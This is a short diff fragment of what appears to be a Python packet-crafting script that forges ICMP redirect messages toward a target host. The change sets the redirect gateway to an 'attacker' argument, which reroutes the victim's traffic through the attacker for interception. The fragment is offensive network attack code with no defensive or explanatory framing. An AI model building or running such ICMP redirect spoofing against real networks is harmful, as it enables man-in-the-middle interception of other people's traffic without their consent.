@@ -39,7 +39,8 @@ ip.dst = args.target
 icmp      = ICMP()
 icmp.type = 5
 icmp.code = args.redirect_code  
-icmp.gw   = args.gateway
+icmp.gw   = args.attacker
+
 #internet header payload
 ip_payload     = IP()
 ip_payload.src = args.target
